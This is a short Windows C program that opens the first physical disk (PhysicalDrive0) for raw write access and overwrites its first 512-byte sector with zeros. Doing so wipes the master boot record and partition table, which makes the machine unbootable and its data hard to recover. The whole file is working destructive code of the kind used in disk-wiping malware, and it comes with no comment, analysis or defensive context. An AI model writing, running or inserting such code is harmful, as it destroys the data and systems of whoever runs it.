#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE h = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (h == INVALID_HANDLE_VALUE) return 1;
    unsigned char zero[512] = {0};
    DWORD written = 0;
    WriteFile(h, zero, 512, &written, NULL);
    FlushFileBuffers(h);
    CloseHandle(h);
    return 0;
}
